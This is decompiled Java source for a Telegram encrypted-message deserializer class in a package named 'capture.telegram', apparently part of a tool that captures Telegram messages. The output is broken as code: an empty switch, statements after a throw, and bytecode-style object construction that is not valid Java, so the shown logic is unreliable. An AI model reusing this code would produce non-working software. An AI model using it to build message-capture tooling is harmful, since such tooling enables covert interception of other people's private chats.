package com.vvt.capture.telegram.internal;

public class TLRPC$EncryptedMessage
  extends TLObject
{
  public byte[] bytes;
  public int chat_id;
  public int date;
  public TLRPC.EncryptedFile file;
  public long random_id;
  
  public static EncryptedMessage TLdeserialize(AbstractSerializedData paramAbstractSerializedData, int paramInt, boolean paramBoolean)
  {
    Object localObject = null;
    switch (paramInt)
    {
    }
    while ((localObject == null) && (paramBoolean))
    {
      localObject = new java/lang/RuntimeException;
      Object[] arrayOfObject = new Object[1];
      Integer localInteger = Integer.valueOf(paramInt);
      arrayOfObject[0] = localInteger;
      String str = String.format("can't parse magic %x in EncryptedMessage", arrayOfObject);
      ((RuntimeException)localObject).<init>(str);
      throw ((Throwable)localObject);
      localObject = new com/vvt/capture/telegram/internal/TLRPC$TL_encryptedMessageService;
      ((TLRPC.TL_encryptedMessageService)localObject).<init>();
      continue;
      localObject = new com/vvt/capture/telegram/internal/TLRPC$TL_encryptedMessage;
      ((TLRPC.TL_encryptedMessage)localObject).<init>();
    }
    if (localObject != null) {
      ((EncryptedMessage)localObject).readParams(paramAbstractSerializedData, paramBoolean);
    }
    return (EncryptedMessage)localObject;
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/telegram/internal/TLRPC$EncryptedMessage.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */